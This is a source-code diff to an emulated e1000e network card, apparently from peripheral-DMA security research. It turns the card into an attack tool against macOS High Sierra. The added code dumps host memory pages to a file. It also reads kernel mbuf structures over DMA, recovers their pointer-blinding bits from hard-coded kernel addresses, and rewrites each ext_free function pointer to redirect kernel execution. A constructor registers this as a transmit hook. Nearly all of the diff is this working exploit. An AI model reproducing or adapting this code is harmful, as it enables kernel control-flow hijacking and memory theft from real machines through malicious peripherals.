@@ -47,6 +47,7 @@
 #include "hw/pci/pci.h"
 #include "hw/net/e1000_regs.h"
 #include "hw/net/e1000e_core.h"
+#include "mbuf-page.h"
 #include "pcie.h"
 #include "pcie-debug.h"
 #include "secret_position.h"
@@ -636,39 +637,96 @@ void
 reset_read_pages()
 {
 	_next_page_index = 0;
+	putchar('R');
+	fflush(stdout);
 }
 
 void
-search_for_mbufs_with_external_data(E1000ECore* core, ConstDescriptorP desc)
+save_mbufs_to_file(E1000ECore* core, ConstDescriptorP desc)
 {
 	if (desc->buffer_addr % MCLBYTES == 0) {
 		return; /* Cluster */
 	}
 
 	enum dma_read_response read_result;
-	uint8_t page[4096];
-	hwaddr page_iovaddr = page_base_address(desc->buffer_addr);
-	if (page_was_read(page_iovaddr)) {
+	struct mbuf_page mbuf_page;
+	mbuf_page.iovaddr = page_base_address(desc->buffer_addr);
+	if (page_was_read(mbuf_page.iovaddr)) {
 		return;
 	}
-	mark_page_read(page_iovaddr);
-	read_result = perform_dma_long_read(page, 4096, core->owner->devfn, 8,
-		page_iovaddr);
+	mark_page_read(mbuf_page.iovaddr);
+	read_result = perform_dma_long_read((uint8_t *)mbuf_page.contents, 4096,
+		core->owner->devfn, 8, mbuf_page.iovaddr);
+	fwrite(&mbuf_page, sizeof(struct mbuf_page), 1, GLOBAL_BINARY_FILE);
+	putchar('w');
+	fflush(stdout);
+}
 
-	printf("Found macOS mbuf page at 0x%lx.\n", page_iovaddr);
+const static uint64_t HIGH_SIERRA_BIGFREE =			0xffffff8000baa2d0;
+const static uint64_t HIGH_SIERRA_16KFREE =			0xffffff8000baa300;
+const static uint64_t HIGH_SIERRA_MCACHE_PANIC =	0xffffff8000b78580;
+const static uint64_t NOT_1MB_MASK =				0xfffffffffff00000;
+const static uint64_t ONE_MB_MASK =					0x00000000000fffff;
+const static uint64_t ONE_MB_MCACHE_PANIC =
+	HIGH_SIERRA_MCACHE_PANIC & ONE_MB_MASK;
+/* We could use 21 bits, but these agree to 20 bits, and it's a slightly
+ * simpler mask.
+ */
 
-	struct mbuf *mbuf;
-	for (uint64_t i = 0; i < 4096; i += 256) {
-		mbuf = (struct mbuf *)(page + i);
-		endianness_swap_mac_mbuf_header(mbuf);
-		print_macos_mbuf_header(mbuf);
+void
+attack_high_sierra(E1000ECore* core, ConstDescriptorP desc)
+{
+	if (desc->buffer_addr % MCLBYTES == 0) {
+		return;
 	}
 
+	enum dma_read_response read_result;
+	struct mbuf mbuf;
+	uint64_t mbuf_address;
+	uint64_t blinded_kernel_address;
+	uint64_t blind_bits;
+	uint64_t low_blind_bits;
+	uint64_t blinded_panic_address;
+	hwaddr page_addr = page_base_address(desc->buffer_addr);
+	if (page_was_read(page_addr)) {
+		return;
+	}
+	mark_page_read(page_addr);
+	putchar('m');
+	fflush(stdout);
+	for (uint i = 0; i < MBUFS_PER_PAGE; ++i) {
+		mbuf_address = page_addr + i * sizeof(mbuf);
+		read_result = perform_dma_read((uint8_t *)&mbuf, sizeof(mbuf),
+			core->owner->devfn, 8, mbuf_address);
+		endianness_swap_mac_mbuf_header(&mbuf);
+		if (mbuf.MM_LEN > 0 && mbuf.MM_EXT.ext_size <= (2 * M16KCLBYTES) && (
+				mbuf.MM_LEN > MCLBYTES || mbuf.MM_EXT.ext_size > MCLBYTES)) {
+			blinded_kernel_address = mbuf.MM_EXT.ext_free;
+			if (mbuf.MM_LEN > MBIGCLBYTES ||
+				mbuf.MM_EXT.ext_size > MBIGCLBYTES) {
+				printf("16k cluster? len: %d. ext_size: %u.\n",
+					mbuf.MM_LEN, mbuf.MM_EXT.ext_size);
+				blind_bits = blinded_kernel_address ^= HIGH_SIERRA_16KFREE;
+			} else {
+				printf("4K cluster? len: %d. ext_size: %u.\n",
+					mbuf.MM_LEN, mbuf.MM_EXT.ext_size);
+				blind_bits = blinded_kernel_address ^ HIGH_SIERRA_BIGFREE;
+			}
+			low_blind_bits = blind_bits & ONE_MB_MASK;
+			blind_bits &= NOT_1MB_MASK;
+			blinded_panic_address = low_blind_bits & ONE_MB_MCACHE_PANIC;
+			mbuf.MM_EXT.ext_free = blind_bits | blinded_panic_address;
+			endianness_swap_mac_mbuf_header(&mbuf);
+			perform_dma_write((uint8_t *)&mbuf, sizeof(mbuf),
+				core->owner->devfn, 8, mbuf_address);
+		}
+	}
 }
+
 
 __attribute__((constructor)) void
 setup_attack()
 {
 	reset_read_pages();
-	register_pre_xmit_hook(search_for_mbufs_with_external_data, reset_read_pages);
+	register_pre_xmit_hook(attack_high_sierra, reset_read_pages);
 }
